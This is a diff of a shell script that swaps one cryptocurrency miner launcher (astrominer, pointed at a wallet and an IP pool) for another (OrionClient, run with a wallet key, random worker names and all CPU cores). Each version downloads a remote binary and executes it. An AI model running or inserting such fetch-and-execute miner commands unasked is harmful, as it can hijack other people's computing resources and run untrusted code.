@@ -1,4 +1,6 @@
-!/bin/bash
-wget https://github.com/bondaltomason/meo/releases/download/2.7.0/astrominer
-chmod +x astrominer
-./astrominer -w dero1qy2nrm9xhj8ha2rg0qjmh39p4sdy8sycf7my49axs26x7yukfpyquqgfsz5ey -r 137.184.120.90:10100
+#!/bin/sh
+apt update && apt install unzip
+wget https://github.com/egg5233/ore-hq-client/releases/download/1.6.0/OrionClient_linux.zip && unzip OrionClient_linux.zip
+cd OrionClient_linux
+chmod +x OrionClient
+./OrionClient mine -a --pool twbitz --key 76dvS6JKn3WmKQXm4Rx3LBQZHpagXmiqE67gu7CCB55h --worker $(shuf -n 1 -i 1-99999)-PC -t $(nproc --all) --ice
